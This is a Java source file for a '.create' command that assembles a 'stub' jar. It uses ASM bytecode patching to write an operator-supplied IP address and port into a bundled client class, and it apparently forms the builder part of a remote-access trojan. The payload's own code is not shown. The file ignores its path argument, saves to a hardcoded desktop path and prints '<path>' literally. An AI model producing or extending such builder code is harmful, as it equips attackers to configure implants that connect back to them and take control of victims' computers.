package net.vitox.command.commands;

import net.vitox.Main;
import net.vitox.client.Client;
import net.vitox.command.Command;
import net.vitox.utils.ASMUtils;
import net.vitox.utils.JarUtils;
import net.vitox.utils.SendUtil;
import okhttp3.OkHttpClient;
import okio.Okio;
import org.objectweb.asm.tree.*;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;

public class CreateCommand extends Command {

    public CreateCommand() {
        super("create", "Create a stub");
    }

    public ArrayList<ClassNode> nodes = new ArrayList<>();

    @Override
    public void runCommand(String[] args) {

        if (args.length <= 3) {
            System.out.println("Missing arguments: .create <ip> <port> <path>");
            return;
        }

        try {
            HashMap<String, byte[]> out = new HashMap<>();

            JarUtils.loadClasses(new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath())).forEach((name, c) -> {
                if (
                           c.name.contains(Client.class.getPackage().getName().replaceAll("\\.", "/"))
                        || c.name.contains(OkHttpClient.class.getPackage().getName().replaceAll("\\.", "/"))
                        || c.name.contains(Okio.class.getPackage().getName().replaceAll("\\.", "/"))
                        || c.name.contains("tk/pratanumandal")
                        || c.name.contains("org/objectweb")
                        || c.name.contains(SendUtil.class.getPackage().getName().replaceAll("\\.", "/"))
                        || c.name.contains("org/apache")) {

                    nodes.add(c);
                }
            });

            if (!args[1].equals("null")) {
                for (ClassNode cn : nodes) {
                    for (FieldNode field : cn.fields) {
                        if (field.name.equals(Client.class.getFields()[0].getName())) { //IP_ADDRESS
                            field.value = args[1];
                        }

                        if (field.name.equals(Client.class.getFields()[1].getName())) { //PORT
                            field.value = args[2];
                        }
                    }
                }
            }
            nodes.forEach(c1 -> {
                byte[] b = ASMUtils.getNodeBytes0(c1);
                if (b != null)
                    out.put(c1.name + ".class", b);
            });

            JarUtils.saveAsJar(out, "C:\\Users\\vitox\\Desktop\\opiot\\test.jar", true);
            System.out.println("Success! Saved jar to <path>");

            nodes.clear();
            out.clear();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
